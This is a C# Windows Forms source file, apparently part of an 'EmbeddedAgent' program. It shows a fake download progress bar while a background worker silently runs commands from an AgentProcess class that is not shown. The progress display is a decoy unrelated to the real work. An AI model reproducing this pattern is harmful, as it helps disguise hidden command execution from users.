using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EmbeddedAgent
{
    public partial class progressForm : Form
    {
        public progressForm()
        {
            InitializeComponent();
        }

        private Task ProcessData(List<string> list, IProgress<ProgressReport> progress)
        {
            int index = 1;
            int totalProcess = list.Count;
            var progressReport = new ProgressReport();

            return Task.Run(() =>
            {
                for (int i = 0; i < totalProcess; i++)
                {
                    progressReport.PercentCompleted = index++ * 100 / totalProcess;
                    progress.Report(progressReport);
                    Thread.Sleep(10);
                }
            });
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            if (!backgroundWorker.IsBusy)
                backgroundWorker.RunWorkerAsync();

            List<string> list = new List<string>();

            for (int i = 0; i < 1000; i++)
                list.Add(i.ToString());

            lblStatus.Text = "Working...";

            var progress = new Progress<ProgressReport>();

            progress.ProgressChanged += (o, report) =>
            {
                lblStatus.Text = string.Format("Processing...{0}%", report.PercentCompleted);
                progressBar.Value = report.PercentCompleted;
                progressBar.Update();
            };

            await ProcessData(list, progress);

            lblStatus.Text = "Dowload Completed!";
            btnStart.Text = "Done";
            btnStart.Enabled = false;
        }

        private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                AgentProcess.ExecuteCommands(AgentProcess.InitCommands());
            }
            catch (Exception ex)
            {
                backgroundWorker.CancelAsync();
                MessageBox.Show(ex.Message, "Message", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }


}
